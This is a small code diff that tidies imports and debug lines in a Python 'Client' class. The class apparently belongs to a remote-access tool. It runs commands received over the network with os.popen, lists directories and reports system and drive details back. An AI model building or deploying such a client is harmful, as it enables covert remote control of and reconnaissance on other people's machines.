@@ -8,8 +8,6 @@ import uuid
 from tempfile import TemporaryFile
 import base64
 import zlib
-import ctypes
-import lzma
 from struct import pack, calcsize, unpack
 import json
 import ctypes
@@ -98,7 +96,6 @@ class Client:
             data_bean.data = os.popen(msg["data"]).read().encode()
             self.send(data_bean.json())
         if msg.get("type") == "dir":
-            print(msg["data"])
             data_bean.raw = File.dir(msg["data"])
             self.send(data_bean.json())
 
@@ -107,8 +104,6 @@ class Client:
         data_bean.type = "init"
         data = data_bean.json()
         data.update({"system": [platform.system(), platform.version(), platform.processor()]})
-        """
-        """
         disk_list = []
         for c in string.ascii_uppercase:
             disk = c + ':'
